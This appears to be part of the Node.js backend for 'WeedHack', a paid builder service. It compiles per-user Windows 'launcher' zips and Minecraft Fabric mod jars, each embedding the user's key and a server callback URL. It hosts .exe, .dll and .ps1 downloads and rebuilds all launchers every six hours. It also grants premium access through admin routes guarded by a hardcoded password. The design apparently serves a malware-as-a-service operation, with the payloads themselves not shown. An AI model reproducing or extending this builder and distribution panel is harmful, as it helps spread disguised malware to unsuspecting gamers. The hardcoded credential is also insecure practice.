  const p = path.join(DOWNLOAD_DIR, stale);
  if (fs.existsSync(p)) { try { fs.unlinkSync(p); console.log(`[startup] removed legacy ${stale}`); } catch {} }
}
try {
  for (const f of fs.readdirSync(BUILD_DIR)) {
    if (f.endsWith('.exe')) {
      try { fs.unlinkSync(path.join(BUILD_DIR, f)); console.log(`[startup] removed legacy build ${f}`); } catch {}
    }
  }
} catch {}

const ALLOWED_EXT = ['.exe', '.zip', '.msi', '.dll', '.bin', '.ps1', '.dat'];

const limitDownloadExe = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 200,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'download limit reached' },
});

app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
  const name = String(req.params.name || '');

  if (!name || name.includes('..') || name.includes('/') || name.includes('\\'))
    return res.status(400).json({ error: 'bad name' });

  if (!/^[A-Za-z0-9_\-\.]+$/.test(name))
    return res.status(400).json({ error: 'bad name' });

  const ext = path.extname(name).toLowerCase();
  if (!ALLOWED_EXT.includes(ext))
    return res.status(400).json({ error: 'file type not allowed' });

  const full = path.resolve(DOWNLOAD_DIR, name);
  const base = path.resolve(DOWNLOAD_DIR);
  if (!full.startsWith(base + path.sep))
    return res.status(400).json({ error: 'bad path' });

  if (!fs.existsSync(full))
    return res.status(404).json({ error: 'not found' });

  const st = fs.statSync(full);
  const ctype = ext === '.zip' ? 'application/zip'
              : ext === '.dat' ? 'application/octet-stream'
              : 'application/octet-stream';
  res.setHeader('Content-Type', ctype);
  res.setHeader('Content-Length', st.size);
  res.setHeader('Content-Disposition', `attachment; filename="${name}"`);
  fs.createReadStream(full).pipe(res);
});

// ---------- builder — windows launcher ----------

app.get('/api/build/bases', requireAuth, (req, res) => {
  res.json([]);
});

app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
  const { key } = req.body || {};

  const row = getOwnUser(req.user.uid);
  const acctKey = row?.account_key || '';
  const buildKey = (typeof key === 'string' && key.trim().length > 0)
    ? key.trim().slice(0, 128)
    : acctKey;

  if (!buildKey) return res.status(400).json({ error: 'no key — type one or set an account key' });

  let zipBuf;
  try {
    const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
    const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
    zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
  } catch (e) {
    console.error('[build] failed:', e);
    const msg = (e.stderr || e.message || 'unknown').toString().slice(-3000);
    return res.status(500).json({ error: 'compile failed: ' + msg });
  }

  const outName = `build_${Date.now()}_u${req.user.uid}.zip`;
  const outPath = path.join(BUILD_DIR, outName);
  fs.writeFileSync(outPath, zipBuf, { mode: 0o644 });

  const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'boot'`).all(req.user.uid);
  for (const b of stale) {
    if (b.stored_name && b.stored_name !== outName) {
      try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
    }
    db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
  }

  const info = db.prepare(sql`
    INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `).run(req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now());

  fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });

  res.json({
    ok: true,
    buildId: Number(info.lastInsertRowid),
    name: outName,
    size: zipBuf.length,
    key: buildKey,
    url: `/api/builds/${info.lastInsertRowid}/download`,
    liveUrl: '/api/downloads/boot.zip',
  });
});

app.get('/api/builds', requireAuth, (req, res) => {
  const rows = db.prepare(sql`
    SELECT id, name, size, base, key, created_at FROM builds
    WHERE user_id = ? ORDER BY created_at DESC LIMIT 100
  `).all(req.user.uid);
  res.json(rows);
});

// ---------- builder — minecraft fabric (must precede /api/builds/:id/* routes) ----------

app.post('/api/build/minecraft', requireAuth, limitMcBuild, async (req, res) => {
  const row = getOwnUser(req.user.uid);
  const acctKey = row?.account_key || '';
  if (!acctKey) return res.status(400).json({ error: 'no account key' });

  const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
  const buildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;

  const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
  const serverBase = `${proto}://${req.headers.host}`;

  mcProgressStore.set(String(buildId), { pct: 0, step: 'queued', at: Date.now() });

  (async () => {
    try {
      const jarBuf = await buildMinecraftMod({
        key: acctKey,
        buildId,
        serverBase,
        target: req.body?.target,
        loaderRange: req.body?.loaderRange,
      });
      const outName = `weedhack_${buildId}_u${req.user.uid}.jar`;
      const outPath = path.join(MC_BUILD_DIR, outName);
      fs.writeFileSync(outPath, jarBuf, { mode: 0o644 });

      const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'minecraft'`).all(req.user.uid);
      for (const b of stale) {
        if (b.stored_name && b.stored_name !== outName) {
          try { fs.unlinkSync(path.join(MC_BUILD_DIR, b.stored_name)); } catch {}
        }
        db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
      }

      db.prepare(sql`
        INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
        VALUES (?, ?, ?, ?, 'minecraft', ?, '{}', ?)
      `).run(req.user.uid, outName, outName, jarBuf.length, acctKey, Date.now());

      mcProgressStore.set(String(buildId), {
        pct: 100, step: 'done',
        jarName: outName, jarSize: jarBuf.length,
        downloadUrl: `/api/builds/minecraft/${buildId}/download`,
        at: Date.now(),
      });
    } catch (e) {
      console.error('[mc-build]', e);
      mcProgressStore.set(String(buildId), {
        pct: 0, step: 'failed',
        error: (e.stderr || e.message || 'unknown').toString().slice(-2000),
        at: Date.now(),
      });
    }
  })();

  res.json({ ok: true, buildId });
});

app.get('/api/build/minecraft/progress/:id', requireAuth, (req, res) => {
  const id = String(req.params.id);
  const p = mcProgressStore.get(id);
  if (!p) return res.status(404).json({ error: 'unknown build' });
  const row = db.prepare(sql`SELECT user_id FROM builds WHERE id = ?`).get(Number(id));
  if (row && row.user_id !== req.user.uid) return res.status(403).json({ error: 'not yours' });
  res.json(p);
});

// MC jar download — must be declared before /api/builds/:id/download so the
// literal "minecraft" segment wins over the numeric :id param.
app.get('/api/builds/minecraft/:id/download', limitDownload, requireAuth, (req, res) => {
  const id = Number(req.params.id);
  const row = db.prepare(sql`
    SELECT name, stored_name, size FROM builds
    WHERE id = ? AND user_id = ? AND base = 'minecraft'
  `).get(id, req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  const src = path.join(MC_BUILD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
  res.setHeader('Content-Type', 'application/java-archive');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
  fs.createReadStream(src).pipe(res);
});

// ---------- windows launcher build download (after minecraft literal) ----------

app.get('/api/builds/:id/download', limitDownload, requireAuth, (req, res) => {
  const id = Number(req.params.id);
  if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
  const row = db.prepare(sql`
    SELECT name, stored_name, size FROM builds WHERE id = ? AND user_id = ?
  `).get(id, req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  const src = path.join(BUILD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition', `attachment; filename="${row.name}"`);
  fs.createReadStream(src).pipe(res);
});

app.delete('/api/builds/:id', requireAuth, (req, res) => {
  const id = Number(req.params.id);
  if (!Number.isFinite(id)) return res.status(404).json({ error: 'not found' });
  const row = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ? AND user_id = ?`).get(id, req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  const p = path.join(BUILD_DIR, row.stored_name);
  try { fs.unlinkSync(p); } catch {}
  db.prepare(sql`DELETE FROM builds WHERE id = ? AND user_id = ?`).run(id, req.user.uid);
  res.json({ ok: true });
});

// ---------- admin ----------

app.post('/api/admin/login', limitAdmin, (req, res) => {
  const { password } = req.body || {};
  if (password === 'Shit123') return res.json({ ok: true });
  res.status(403).json({ error: 'Forbidden' });
});

app.post('/api/admin/upgrade', limitAdmin, (req, res) => {
  const { password, accountKey, days } = req.body || {};

  if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
  if (!accountKey) return res.status(400).json({ error: 'Account key required' });
  if (!days || isNaN(days)) return res.status(400).json({ error: 'Valid days required' });

  const user = db.prepare(sql`SELECT id, premium_until FROM users WHERE account_key = ?`).get(accountKey);
  if (!user) return res.status(404).json({ error: 'User not found' });

  const baseTime = (user.premium_until && user.premium_until > Date.now()) ? user.premium_until : Date.now();
  const newExpiry = baseTime + (Number(days) * 24 * 60 * 60 * 1000);

  db.prepare(sql`UPDATE users SET premium_until = ? WHERE id = ?`).run(newExpiry, user.id);

  const dateStr = new Date(newExpiry).toLocaleString();
  res.json({ ok: true, message: `Premium active until ${dateStr}` });
});

app.post('/api/admin/remove', limitAdmin, (req, res) => {
  const { password, accountKey } = req.body || {};

  if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
  if (!accountKey) return res.status(400).json({ error: 'Account key required' });

  const user = db.prepare(sql`SELECT id FROM users WHERE account_key = ?`).get(accountKey);
  if (!user) return res.status(404).json({ error: 'User not found' });

  db.prepare(sql`UPDATE users SET premium_until = 0 WHERE id = ?`).run(user.id);
  res.json({ ok: true, message: 'Premium removed successfully' });
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });

// ---------- auto-refresh every 6h ----------
const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;

async function refreshAllBuilds() {
  try {
    const oldExe = path.join(DOWNLOAD_DIR, 'boot.exe');
    if (fs.existsSync(oldExe)) try { fs.unlinkSync(oldExe); } catch {}

    const userIds = db.prepare(sql`SELECT DISTINCT user_id FROM builds WHERE base = 'boot'`).all().map(r => r.user_id);
    if (userIds.length === 0) {
      console.log('[auto-refresh] no builds to refresh');
      return;
    }

    let liveZipWritten = false;

    for (const uid of userIds) {
      try {
        const u = db.prepare(sql`SELECT account_key FROM users WHERE id = ?`).get(uid);
        if (!u || !u.account_key) continue;

        const latest = db.prepare(sql`
          SELECT id, key FROM builds WHERE user_id = ? AND base = 'boot' ORDER BY created_at DESC LIMIT 1
        `).get(uid);
        if (!latest) continue;

        console.log(`[auto-refresh] user ${uid} build ${latest.id}...`);
        const zipBuf = await buildBoot({ key: latest.key || u.account_key, buildId: latest.id });
        const zipName = `build_${Date.now()}_u${uid}.zip`;
        fs.writeFileSync(path.join(BUILD_DIR, zipName), zipBuf, { mode: 0o644 });

        const old = db.prepare(sql`SELECT stored_name FROM builds WHERE id = ?`).get(latest.id);

        db.prepare(sql`
          UPDATE builds SET name = ?, stored_name = ?, size = ?, created_at = ? WHERE id = ?
        `).run(zipName, zipName, zipBuf.length, Date.now(), latest.id);

        if (old && old.stored_name && old.stored_name !== zipName) {
          try { fs.unlinkSync(path.join(BUILD_DIR, old.stored_name)); } catch {}
        }

        const stale = db.prepare(sql`
          SELECT id, stored_name FROM builds WHERE user_id = ? AND id != ? AND base = 'boot'
        `).all(uid, latest.id);
        for (const b of stale) {
          try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
          db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
        }

        if (!liveZipWritten) {
          fs.writeFileSync(path.join(DOWNLOAD_DIR, 'boot.zip'), zipBuf, { mode: 0o644 });
          liveZipWritten = true;
        }

        console.log(`[auto-refresh] user ${uid} → ${zipBuf.length} B`);
      } catch (e) {
        console.error(`[auto-refresh] user ${uid}: ${e.message}`);
      }
    }
  } catch (e) {
    console.error('[auto-refresh] failed:', e.message);
  }
}

setInterval(refreshAllBuilds, AUTO_REFRESH_INTERVAL_MS);
setTimeout(refreshAllBuilds, 10_000);

// ---------- progress store GC ----------
setInterval(() => {
  const cutoff = Date.now() - 10 * 60 * 1000;
  for (const [k, v] of mcProgressStore) {
    if (v.at && v.at < cutoff) mcProgressStore.delete(k);
  }
}, 5 * 60 * 1000).unref();

// ---------- udp / http / https boot ----------

const udpSock = startUdp({
  host: CFG.bindHost, port: CFG.udpPort,
  onMsg: (text, rinfo, s) => {
    s.send(Buffer.from(`weedhack: ${text}`), rinfo.port, rinfo.address, () => {});
  },
});

const httpServer = http.createServer(app);
httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
  console.log(`WeedHack http  on ${CFG.bindHost}:${CFG.httpPort}`);
});

const tlsHttpServer = https.createServer(tlsOpts, app);
tlsHttpServer.on('tlsClientError', (e) => console.log(`[tls] client err: ${e.message}`));
tlsHttpServer.listen(CFG.tcpPort, CFG.bindHost, () => {
  console.log(`WeedHack https on ${CFG.bindHost}:${CFG.tcpPort}`);
  console.log(`WeedHack udp   on ${CFG.bindHost}:${CFG.udpPort}`);
});

let shuttingDown = false;

function shutdown(sig) {
  if (shuttingDown) return;
  shuttingDown = true;
  console.log(`\n[shutdown] ${sig}`);

  httpServer.close(() => console.log('[shutdown] http closed'));
  tlsHttpServer.close(() => console.log('[shutdown] https closed'));

  closeUdp();

  setTimeout(() => process.exit(0), 3000).unref();
}

process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException',  (e) => console.error('[uncaught]', e));
process.on('unhandledRejection', (e) => console.error('[unhandled]', e));